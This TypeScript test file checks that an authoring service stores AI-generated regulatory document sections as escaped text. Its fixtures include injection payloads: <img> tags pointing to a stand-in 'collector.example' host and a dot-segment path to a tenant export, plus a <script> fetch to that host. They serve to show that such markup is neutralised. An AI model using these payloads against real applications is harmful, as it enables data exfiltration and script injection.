/**
 * Section generation stores the model's text as text, in the form every reader
 * reads as the model's words (periodic review 2026-09-28, editor family,
 * SEC-B-1/2 follow-on b6).
 *
 * `generateSection` wrote the model's body into `coauthor_documents.content`
 * as it came back. The eCTD leaf renderer parses that column as HTML, and the
 * co-author editor does too once it holds a known tag, so an `<img>` in model
 * output, which can never be an uploaded figure because a model uploads
 * nothing, was stored as a figure for every later reader.
 *
 * The prompt asks for a markdown body, which is text. It is stored as
 * `plainTextToHtml` (@shared/authoring/plain-text-html) writes it: escaped
 * paragraphs. No model output becomes markup, and `<p>` is a known tag, so the
 * readers below all read the words as the model wrote them:
 *   - the co-author editor's boot path (RichSectionEditor, format "html"):
 *     `looksLikeHtml(stored) ? stored : plainTextToHtml(stored)`, parsed into
 *     the editor's document, and opened in rich mode only when the fidelity
 *     gate finds nothing lost;
 *   - the export's reader of a section string, `sectionContentToBlocks`, which
 *     reads a string as HTML only when `contentLooksLikeHtml` finds a known tag;
 *   - the eCTD leaf renderer's `htmlToPlainText`, which parses every string as
 *     HTML.
 * Escaped text alone holds no known tag, so the first two would read it as
 * plain text and show "R&amp;D" for "R&D". Sanitizing the body as HTML would
 * delete words wherever a `<` begins one: "Impurity B was <LOQ in all 3
 * batches" would be stored as "Impurity B was ".
 *
 * A completion with no body is stored as "", an empty draft, as it was before
 * this change. `plainTextToHtml('')` is "<p></p>", an empty paragraph, and the
 * eCTD leaf resolver's gap rule (`(content ?? '').trim()`) and the leaf source
 * pins read that as authored content, so the empty draft would be filed as a
 * blank leaf instead of reported as a gap.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { JSDOM } from 'jsdom';
import { generateJSON } from '@tiptap/core';
import StarterKit from '@tiptap/starter-kit';

const h = vi.hoisted(() => ({
  route: vi.fn(),
  inserted: [] as Array<Record<string, unknown>>,
}));

vi.mock('../../../db', () => {
  const selectChain = {
    from: () => selectChain,
    where: () => selectChain,
    limit: async () => [{ id: 11 }],
  };
  return {
    db: {
      select: () => selectChain,
      insert: () => ({
        values: (v: Record<string, unknown>) => {
          h.inserted.push(v);
          return { returning: async () => [{ id: 901 }] };
        },
      }),
    },
  };
});
vi.mock('../../ai-gateway', () => ({ getGateway: () => ({ route: h.route }) }));
vi.mock('../../auditService', () => ({ default: { logAction: vi.fn(async () => undefined) } }));

import { generateSection } from '../section-generation-service';
import { htmlToPlainText } from '../../ectd/leaf-pdf-renderer';
import { contentLooksLikeHtml, sectionContentToBlocks } from '../../../export/authoring-section-content';
import { plainTextToHtml as storedFormOf } from '@shared/authoring/plain-text-html';
import {
  assessFidelity,
  docToPlainText,
  looksLikeHtml,
  plainTextToHtml as editorPlainTextToHtml,
} from '@/concept2cure/v2/editor/roundTrip';

const TRAILER = '```json\n{ "citations": [{ "claim": "Stable", "evidenceId": "E1" }], "ungrounded": [] }\n```';

/** Section generation on a completion exactly as the model returned it. */
async function complete(completion: string) {
  h.route.mockResolvedValueOnce({ content: completion });
  return generateSection(
    { submissionId: 11, sectionCode: '2.3.P.8', evidence: [{ id: 'E1', source: 'stability', text: 'Stable.' }] },
    { organizationId: 7, userId: 41 },
  );
}

/** A completion of the given body, then the JSON trailer the prompt asks for. */
function generate(modelBody: string) {
  return complete(`${modelBody}\n\n${TRAILER}`);
}

function storedContent(): string {
  expect(h.inserted).toHaveLength(1);
  return String(h.inserted[0].content);
}

/** The elements a browser builds from the stored value. */
function elementsIn(stored: string): string[] {
  const body = new JSDOM(`<body>${stored}</body>`).window.document.body;
  return [...body.querySelectorAll('*')].map((el) => el.tagName.toLowerCase());
}

/**
 * What the co-author editor shows for a stored value: RichSectionEditor's boot
 * path for format "html", with the editor's own functions. StarterKit stands in
 * for the editor's extension list; paragraphs and hard breaks, all this stored
 * form holds, parse the same under both. `generateJSON` and the gate need a
 * DOM, so a JSDOM window stands in for the browser's for the length of the
 * call. `text` is the parsed document's text, paragraphs separated by a blank
 * line and hard breaks as newlines (docToPlainText). `lossy` true would open
 * the draft in source mode, showing the raw string.
 */
function coauthorEditorShows(stored: string): { text: string; lossy: boolean } {
  const { window } = new JSDOM('');
  vi.stubGlobal('window', window);
  vi.stubGlobal('DOMParser', window.DOMParser);
  vi.stubGlobal('Node', window.Node);
  try {
    const html = looksLikeHtml(stored) ? stored : editorPlainTextToHtml(stored);
    const doc = generateJSON(html, [StarterKit]);
    return { text: docToPlainText(doc), lossy: assessFidelity(stored, doc).lossy };
  } finally {
    vi.unstubAllGlobals();
  }
}

/** The export's reading of a section string: one line per block. */
function exportReads(stored: string): string {
  return sectionContentToBlocks(stored)
    .map((b) => b.runs.map((r) => r.text).join(''))
    .join('\n');
}

/** A text's non-blank lines, which is what the export makes blocks of. */
function linesOf(text: string): string {
  return text
    .split('\n')
    .map((line) => line.trim())
    .filter(Boolean)
    .join('\n');
}

/** Every reader reads the stored value as exactly the model's words. Each
 *  check is soft, so a failure names every reader that misreads, not only the
 *  first. */
function expectEveryReaderReads(stored: string, modelBody: string) {
  // Both known-tag rules take the stored value as HTML, whose only markup is
  // the paragraphs and line breaks that carry the text.
  expect.soft(contentLooksLikeHtml(stored), 'export: contentLooksLikeHtml').toBe(true);
  expect.soft(looksLikeHtml(stored), 'editor: looksLikeHtml').toBe(true);
  expect
    .soft(elementsIn(stored).filter((tag) => tag !== 'p' && tag !== 'br'), 'elements besides p and br')
    .toEqual([]);

  expect.soft(coauthorEditorShows(stored), 'the co-author editor shows').toEqual({ text: modelBody, lossy: false });
  const kinds = sectionContentToBlocks(stored).map((b) => b.kind);
  expect.soft(kinds.filter((kind) => kind !== 'paragraph'), 'export blocks besides paragraphs').toEqual([]);
  expect.soft(exportReads(stored), 'the export reads').toBe(linesOf(modelBody));
  expect.soft(htmlToPlainText(stored), 'the eCTD leaf reads').toBe(modelBody);
}

beforeEach(() => {
  h.route.mockReset();
  h.inserted.length = 0;
});

describe('generateSection stores the model body as text', () => {
  it.each([
    ['an external address', 'https://collector.example/p.png?d=1'],
    ['dot segments out of the image route', '/api/authoring/images/../../tenant-export/full'],
    ['an inline SVG', 'data:image/svg+xml;base64,PHN2Zz4='],
  ])('%s: the stored draft holds no image, and the result is what was stored', async (_label, src) => {
    const modelBody = `<p>The product is stable for 24 months.</p><img src="${src}" alt="Figure 1">`;
    const result = await generate(modelBody);

    const stored = storedContent();
    expect(elementsIn(stored)).not.toContain('img');
    expectEveryReaderReads(stored, modelBody);
    expect(result.body).toBe(stored);
    // The trailer is still read.
    expect(result.citations).toEqual([{ claim: 'Stable', evidenceId: 'E1' }]);
  });

  it('script the model emits is stored as text, never as an element', async () => {
    const modelBody = 'Summary.<script>fetch("https://collector.example")</script>';
    await generate(modelBody);
    const stored = storedContent();
    expectEveryReaderReads(stored, modelBody);
    expect(stored).toBe('<p>Summary.&lt;script&gt;fetch("https://collector.example")&lt;/script&gt;</p>');
  });

  it.each([
    ['a limit of quantitation', 'Impurity B was <LOQ in all 3 batches; assay was 99.1%.'],
    ['an upper limit of normal', 'ALT remained <ULN (n=40) & no Hy\'s law case was seen.'],
    ['a markdown autolink', 'See <https://www.fda.gov/guidance> for the method.'],
    ['a plain comparison', 'Mean change 2.1 (p < 0.05) & sustained; > 90% of subjects responded.'],
    ['an ampersand', 'R&D summary [E1].'],
    ['character references written as text', 'The source prints the limit as "&lt;LOQ" and the sponsor as "R&amp;D".'],
    [
      'paragraphs and line breaks',
      '## 2.3.P.8 Stability\n\nNo trend was observed at 25 °C/60% RH [E1].\n\n' +
        '- Assay: 98.7–101.2%\n- **Total impurities**: 0.4% (<0.5% limit)',
    ],
  ])('%s: every reader reads back every word the model wrote', async (_label, modelBody) => {
    const result = await generate(modelBody);
    const stored = storedContent();
    expectEveryReaderReads(stored, modelBody);
    expect(result.body).toBe(stored);
  });

  it('escapes exactly <, > and &, inside one paragraph (guard)', async () => {
    await generate('Mean change 2.1 (p < 0.05) & sustained; > 90% of subjects responded.');
    expect(storedContent()).toBe(
      '<p>Mean change 2.1 (p &lt; 0.05) &amp; sustained; &gt; 90% of subjects responded.</p>',
    );
  });

  it('stores a markdown body as its paragraphs and line breaks, words unchanged (guard)', async () => {
    const prose =
      '## 2.3.P.8 Stability\n\nNo trend was observed at 25 °C/60% RH [E1].\n\n' +
      '- Assay: 98.7–101.2%\n- **Total impurities**: 0.4%\n\n| Batch | Assay |\n|---|---|\n| 1 | 99.1% |';
    const result = await generate(prose);
    const stored = storedContent();
    expect(stored).toBe(
      '<p>## 2.3.P.8 Stability</p><p>No trend was observed at 25 °C/60% RH [E1].</p>' +
        '<p>- Assay: 98.7–101.2%<br>- **Total impurities**: 0.4%</p>' +
        '<p>| Batch | Assay |<br>|---|---|<br>| 1 | 99.1% |</p>',
    );
    expect(result.body).toBe(stored);
    expect(coauthorEditorShows(stored)).toEqual({ text: prose, lossy: false });
    expect(exportReads(stored)).toBe(linesOf(prose));
    // The leaf renderer is not asserted on this body: it joins a line that
    // begins with "|" onto the line before, as it does for any stored text,
    // so a markdown table reads as one line there however it is stored.
  });

  it('stores a body written with CRLF line endings as the same paragraphs and line breaks (guard)', async () => {
    const result = await generate('No trend was observed [E1].\r\n\r\n- Assay: 99.1%\r\n- Water: 0.2%');
    const stored = storedContent();
    expect(stored).toBe('<p>No trend was observed [E1].</p><p>- Assay: 99.1%<br>- Water: 0.2%</p>');
    expect(result.body).toBe(stored);
  });

  it('the editor converts plain text with the function that stores it (one implementation)', () => {
    expect(editorPlainTextToHtml).toBe(storedFormOf);
  });
});

/**
 * The prompt tells the model to list in `ungrounded` what the evidence does not
 * support, and the route's evidence defaults to none, so a completion holding
 * only the JSON trailer is an expected answer. An empty completion lands in the
 * same place. Either is stored as "", an empty draft, which the eCTD leaf
 * resolver reports as a gap ("has no authored content"). "<p></p>" would pass
 * its `(content ?? '').trim()` check and be filed as a blank leaf.
 */
describe('generateSection stores an empty body as an empty draft', () => {
  const UNGROUNDED = 'Shelf life: no stability evidence was provided.';
  it.each([
    { label: 'only the JSON trailer', completion: TRAILER, citations: [{ claim: 'Stable', evidenceId: 'E1' }], ungrounded: [] },
    {
      label: 'only a trailer listing what the evidence does not support',
      completion: `\`\`\`json\n{ "citations": [], "ungrounded": ["${UNGROUNDED}"] }\n\`\`\``,
      citations: [],
      ungrounded: [UNGROUNDED],
    },
    { label: 'an empty completion', completion: '', citations: [], ungrounded: [] },
    { label: 'a completion of whitespace', completion: ' \n\n\t \r\n', citations: [], ungrounded: [] },
  ])('$label: the draft and the result body are "", and the trailer is still read', async ({ completion, citations, ungrounded }) => {
    const result = await complete(completion);
    const stored = storedContent();
    expect(stored).toBe('');
    expect(result.body).toBe('');
    expect(result.citations).toEqual(citations);
    expect(result.ungrounded).toEqual(ungrounded);
    expect(h.inserted[0].metadata).toEqual({
      authoring: { promptVersion: 'section-generation@v1.0', citations, ungrounded, submissionId: 11 },
    });
    // Every reader reads it as an empty draft.
    expect(coauthorEditorShows(stored)).toEqual({ text: '', lossy: false });
    expect(sectionContentToBlocks(stored)).toEqual([]);
    expect(htmlToPlainText(stored)).toBe('');
  });
});
